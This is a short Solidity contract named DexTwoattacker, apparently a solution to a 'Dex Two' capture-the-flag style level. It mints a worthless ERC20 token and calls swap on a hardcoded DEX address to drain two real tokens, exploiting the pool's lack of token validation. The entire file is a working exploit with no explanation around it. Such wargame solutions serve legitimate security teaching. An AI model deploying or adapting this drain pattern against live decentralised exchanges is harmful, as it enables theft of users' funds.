pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint amount) external;
}

contract DexTwoattacker is ERC20 {

    IDexTwo target = IDexTwo(0x9e70410FB8924898Bf01a3F72F2f7A6847cC8956);

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 400);
    }

    function drain(address _token1, address _token2) public {
        target.swap(address(this), _token1, 100);
        target.swap(_token1, _token2, 200);
    } 
}